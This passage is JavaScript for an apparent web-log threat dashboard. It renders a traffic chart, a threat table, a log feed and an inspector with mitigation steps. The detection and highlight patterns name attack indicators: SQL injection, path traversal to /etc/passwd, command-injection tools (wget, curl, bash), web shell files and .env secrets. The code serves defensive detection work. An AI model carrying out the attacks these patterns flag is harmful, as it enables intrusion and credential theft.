  }));
  _tlPts = pts;

  // Gradient fill
  const grad = ctx.createLinearGradient(0, PAD_T, 0, H - PAD_B);
  grad.addColorStop(0,    `rgba(${accentRGB}, 0.24)`);
  grad.addColorStop(0.55, `rgba(${accentRGB}, 0.07)`);
  grad.addColorStop(1,    `rgba(${accentRGB}, 0.0)`);
  ctx.fillStyle = grad;
  ctx.beginPath();
  ctx.moveTo(pts[0].x, H - PAD_B);
  ctx.lineTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length; i++) {
    const cpX = (pts[i-1].x + pts[i].x) / 2;
    ctx.bezierCurveTo(cpX, pts[i-1].y, cpX, pts[i].y, pts[i].x, pts[i].y);
  }
  ctx.lineTo(pts[pts.length - 1].x, H - PAD_B);
  ctx.closePath();
  ctx.fill();

  // Stroke with glow
  ctx.save();
  ctx.shadowColor = `rgba(${accentRGB}, 0.45)`;
  ctx.shadowBlur  = 9;
  ctx.strokeStyle = `rgba(${accentRGB}, 1)`;
  ctx.lineWidth   = 2.2;
  ctx.lineJoin    = 'round';
  ctx.beginPath();
  ctx.moveTo(pts[0].x, pts[0].y);
  for (let i = 1; i < pts.length; i++) {
    const cpX = (pts[i-1].x + pts[i].x) / 2;
    ctx.bezierCurveTo(cpX, pts[i-1].y, cpX, pts[i].y, pts[i].x, pts[i].y);
  }
  ctx.stroke();
  ctx.restore();

  // Vertical drop line at peak
  const peakIdx = vals.indexOf(peakVal);
  ctx.save();
  ctx.setLineDash([3, 5]);
  ctx.strokeStyle = `rgba(${violetRGB}, 0.3)`;
  ctx.lineWidth   = 1;
  ctx.beginPath();
  ctx.moveTo(pts[peakIdx].x, pts[peakIdx].y + 6);
  ctx.lineTo(pts[peakIdx].x, H - PAD_B);
  ctx.stroke();
  ctx.restore();

  // Dots
  pts.forEach((p, i) => {
    const isPeak = (i === peakIdx);
    if (isPeak) {
      ctx.beginPath();
      ctx.arc(p.x, p.y, 10, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(${violetRGB}, 0.12)`;
      ctx.fill();
      ctx.beginPath();
      ctx.arc(p.x, p.y, 6.5, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(${violetRGB}, 0.2)`;
      ctx.fill();
    }
    ctx.save();
    ctx.shadowColor = isPeak ? `rgba(${violetRGB}, 0.85)` : `rgba(${accentRGB}, 0.65)`;
    ctx.shadowBlur  = isPeak ? 12 : 7;
    ctx.beginPath();
    ctx.arc(p.x, p.y, isPeak ? 4.5 : 3, 0, Math.PI * 2);
    ctx.fillStyle = isPeak ? `rgb(${violetRGB})` : `rgb(${accentRGB})`;
    ctx.fill();
    ctx.restore();
    if (isPeak) {
      ctx.beginPath();
      ctx.arc(p.x, p.y, 1.5, 0, Math.PI * 2);
      ctx.fillStyle = 'rgba(255,255,255,0.9)';
      ctx.fill();
    }
  });

  // X-axis labels
  ctx.fillStyle  = lblColor;
  ctx.font       = `600 9px 'Geist Mono',monospace`;
  ctx.textAlign  = 'center';
  const skip = Math.max(1, Math.ceil(keys.length / 8));
  keys.forEach((k, i) => {
    if (i % skip === 0) ctx.fillText(k, pts[i].x, H - PAD_B + 15);
  });

  // Baseline
  ctx.strokeStyle = isDark ? 'rgba(255,255,255,0.07)' : 'rgba(0,0,0,0.08)';
  ctx.lineWidth   = 1;
  ctx.setLineDash([]);
  ctx.beginPath();
  ctx.moveTo(PAD_L, H - PAD_B);
  ctx.lineTo(W - PAD_R, H - PAD_B);
  ctx.stroke();

  _attachTimelineTooltip(canvas, pts, keys, vals, max, W, H, PAD_B);
}

function _attachTimelineTooltip(canvas, pts, keys, vals, max, W, H, PAD_B) {
  const tooltip = document.getElementById('timeline-tooltip');
  const ttTime  = document.getElementById('tt-time');
  const ttCount = document.getElementById('tt-count');
  const ttBar   = document.getElementById('tt-bar');
  if (!tooltip) return;

  if (canvas._tlMove)  canvas.removeEventListener('mousemove',  canvas._tlMove);
  if (canvas._tlLeave) canvas.removeEventListener('mouseleave', canvas._tlLeave);

  canvas._tlMove = (e) => {
    const rect = canvas.getBoundingClientRect();
    const mx   = e.clientX - rect.left;
    let nearest = 0, minDist = Infinity;
    pts.forEach((p, i) => {
      const d = Math.abs(p.x - mx);
      if (d < minDist) { minDist = d; nearest = i; }
    });
    if (minDist > 52) { tooltip.style.display = 'none'; return; }

    ttTime.textContent  = keys[nearest];
    ttCount.textContent = `${vals[nearest].toLocaleString()} req${vals[nearest] !== 1 ? 's' : ''}`;
    if (ttBar) ttBar.style.width = Math.round((vals[nearest] / max) * 90) + 'px';

    let left = pts[nearest].x + 14;
    if (left + 120 > W) left = pts[nearest].x - 132;
    tooltip.style.left    = left + 'px';
    tooltip.style.top     = Math.max(6, pts[nearest].y - 42) + 'px';
    tooltip.style.display = 'flex';
  };

  canvas._tlLeave = () => { tooltip.style.display = 'none'; };
  canvas.addEventListener('mousemove',  canvas._tlMove);
  canvas.addEventListener('mouseleave', canvas._tlLeave);
}

// Redraw on resize
(function () {
  let _tlResizeTimer;
  window.addEventListener('resize', () => {
    clearTimeout(_tlResizeTimer);
    _tlResizeTimer = setTimeout(() => {
      if (_tlKeys.length) {
        const buckets = {};
        _tlKeys.forEach((k, i) => { buckets[k] = _tlVals[i]; });
        renderTimeline(buckets);
      }
    }, 120);
  });
})();


function setFilter(level, btn) {
  activeFilter = level;
  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  renderThreats(currentReport.threats);
}

function renderThreats(threats) {
  // Store the original index with each threat
  const mapped = threats.map((t, originalIdx) => ({ t, originalIdx }));
  const filtered = activeFilter === 'ALL' ? mapped : mapped.filter(item => item.t.level === activeFilter);
  const tbody = document.getElementById('threat-tbody');
  
  if (!filtered.length) { 
    tbody.innerHTML=`<tr><td colspan="5" style="text-align:center;color:var(--text-dim);padding:3rem;font-family:var(--font-mono)">No active threats identified in this category.</td></tr>`; 
    return; 
  }
  
  tbody.innerHTML = filtered.map((item, idx) => `
    <tr class="threat-row" onclick="inspectThreat(this, ${item.originalIdx})">
      <td><span class="badge badge-${item.t.level}">${item.t.level}</span></td>
      <td style="color:var(--text-primary); font-weight:600">${escHTML(item.t.rule_name)}</td>
      <td style="color:var(--accent)">${item.t.ip||'—'}</td>
      <td style="color:var(--sev-medium); font-weight:600">${item.t.count}</td>
      <td style="color:var(--text-secondary)">${new Date(item.t.timestamp).toLocaleTimeString()}</td>
    </tr>`).join('');
}

function renderLogFeed(rawText) {
  const feed = document.getElementById('log-feed');
  const lines = rawText.split('\n').filter(line => line.trim());
  const maxLines = lines.slice(0, 100);
  document.getElementById('feed-count').textContent = `Showing ${maxLines.length} of ${lines.length} entries`;
  feed.innerHTML = maxLines.map(line => {
    let cls = 'ok';
    if (SQLI.test(line) || TRAV.test(line) || CMD_INJ.test(line) || WEB_SHELL.test(line)) cls='HIGH';
    else if (XSS.test(line) || SENS.test(line) || CRED_LEAK.test(line) || LFI_RFI.test(line)) cls='MEDIUM';
    else if (/failed|invalid user|unauthorized/i.test(line)) cls='LOW';
    return `<div class="log-line ${cls}">${escHTML(line)}</div>`;
  }).join('');
}

function filterLogFeed() {
  const query = document.getElementById('log-search-bar').value.toLowerCase();
  const feed = document.getElementById('log-feed');
  const lines = rawLogsText.split('\n').filter(line => line.trim());
  const filteredLines = [];
  
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].toLowerCase().includes(query)) {
      filteredLines.push(lines[i]);
    }
    if (filteredLines.length >= 100) break; // Limit UI lag
  }
  
  document.getElementById('feed-count').textContent = `Showing ${filteredLines.length} of ${lines.length} matching entries`;
  
  feed.innerHTML = filteredLines.map(line => {
    let cls = 'ok';
    if (SQLI.test(line) || TRAV.test(line) || CMD_INJ.test(line) || WEB_SHELL.test(line)) cls='HIGH';
    else if (XSS.test(line) || SENS.test(line) || CRED_LEAK.test(line) || LFI_RFI.test(line)) cls='MEDIUM';
    else if (/failed|invalid user|unauthorized/i.test(line)) cls='LOW';
    return `<div class="log-line ${cls}">${escHTML(line)}</div>`;
  }).join('');
}

function inspectThreat(rowEl, originalIdx) {
  // Highlight active row
  document.querySelectorAll('.threat-row').forEach(r => r.classList.remove('active'));
  if (rowEl) rowEl.classList.add('active');

  const t = currentReport.threats[originalIdx];
  const ruleId = t.rule_id;
  const mit = MITIGATIONS[ruleId] || {
    name: t.rule_name,
    desc: t.description,
    steps: ["Observe payload data", "Verify integrity of file inputs", "Check server firewalls"],
    action: "Block malicious requests immediately."
  };

  // Set severity-specific styling classes on the inspector card
  const inspectorCard = document.getElementById('inspector-card');
  if (inspectorCard) {
    inspectorCard.classList.remove('inspector-card--CRITICAL', 'inspector-card--HIGH', 'inspector-card--MEDIUM', 'inspector-card--LOW', 'inspector-card--INFO');
    inspectorCard.classList.add(`inspector-card--${t.level}`);
  }

  // Populate inspector
  document.getElementById('insp-badge').className = `badge badge-${t.level}`;
  document.getElementById('insp-badge').textContent = t.level;
  document.getElementById('insp-title').textContent = mit.name;
  document.getElementById('insp-rule-id').textContent = ruleId;
  document.getElementById('insp-desc').textContent = mit.desc;
  
  document.getElementById('insp-ip').textContent = t.ip || '—';
  document.getElementById('insp-user').textContent = t.user || '—';
  document.getElementById('insp-count').textContent = t.count;
  document.getElementById('insp-time').textContent = new Date(t.timestamp).toLocaleTimeString();

  // Highlight matches in evidence
  const container = document.getElementById('evidence-container');
  container.innerHTML = '';
  t.evidence.forEach(evLine => {
    let highlighted = escHTML(evLine);
    // Basic regex highlights depending on rules
    if (ruleId === 'R001') {
      highlighted = highlighted.replace(/(union[\s+]+select|select|from|insert|drop|--|'|1=1)/gi, '<mark>$1</mark>');
    } else if (ruleId === 'R002') {
      highlighted = highlighted.replace(/(script|onerror|onload|eval|alert|cookie)/gi, '<mark>$1</mark>');
    } else if (ruleId === 'R003') {
      highlighted = highlighted.replace(/(\.\.\/|\.\.\\)/g, '<mark>$1</mark>');
    } else if (ruleId === 'R011') {
      highlighted = highlighted.replace(/(http:\/\/|https:\/\/|\/etc\/passwd|win\.ini|boot\.ini)/gi, '<mark>$1</mark>');
    } else if (ruleId === 'R012') {
      highlighted = highlighted.replace(/(whoami|id|cat|wget|curl|sh|bash)/gi, '<mark>$1</mark>');
    } else if (ruleId === 'R013') {
      highlighted = highlighted.replace(/(shell\.php|cmd\.php|cmd\.jsp)/gi, '<mark>$1</mark>');
    } else if (ruleId === 'R014') {
      highlighted = highlighted.replace(/(\.env|config\.json|database\.yml)/gi, '<mark>$1</mark>');
    }
    const div = document.createElement('div');
    div.className = 'evidence-line';
    div.innerHTML = highlighted;
    container.appendChild(div);
  });

  // Load mitigations
  const list = document.getElementById('mitigation-list');
  list.innerHTML = mit.steps.map(s => `<li>${s}</li>`).join('');

  // Command
  document.getElementById('playbook-action-cmd').textContent = mit.action.replace('<IP>', t.ip || 'ATTACKER_IP');

  // Toggle display
  document.getElementById('inspector-placeholder').style.display = 'none';
  document.getElementById('inspector-content').style.display = 'block';
}

function exportReportJSON() {
  if (!currentReport) return;
  const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(currentReport.original || currentReport, null, 2));
  const a = document.createElement('a');
  a.setAttribute("href", dataStr);
  a.setAttribute("download", `shield_report_${new Date().toISOString().slice(0,10)}.json`);
  document.body.appendChild(a);
  a.click();
  a.remove();
}

function escHTML(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

// Clock Updater
function updateClock() {
  const clockEl = document.getElementById('topbar-clock');
  if (clockEl) {
    const now = new Date();
    clockEl.textContent = now.toTimeString().split(' ')[0];
  }
}
setInterval(updateClock, 1000);
updateClock();

// Theme Toggle
function toggleTheme() {
  const body = document.body;
  const currentTheme = body.getAttribute('data-theme');
  const nextTheme = currentTheme === 'dark' ? 'light' : 'dark';
  body.setAttribute('data-theme', nextTheme);
  localStorage.setItem('shield-theme', nextTheme);
  const iconLight = document.getElementById('theme-icon-light');
  const iconDark  = document.getElementById('theme-icon-dark');
  if (nextTheme === 'light') {
    iconLight.style.display = 'block';
    iconDark.style.display  = 'none';
  } else {
    iconLight.style.display = 'none';
    iconDark.style.display  = 'block';
  }
}

// Restore saved theme
(function() {
  const saved = localStorage.getItem('shield-theme') || 'dark';
  document.body.setAttribute('data-theme', saved);
  const iconLight = document.getElementById('theme-icon-light');
  const iconDark  = document.getElementById('theme-icon-dark');
  if (iconLight && iconDark) {
    iconLight.style.display = saved === 'light' ? 'block' : 'none';
    iconDark.style.display  = saved === 'dark'  ? 'block' : 'none';
  }
})();

// Initialize Lucide
lucide.createIcons();
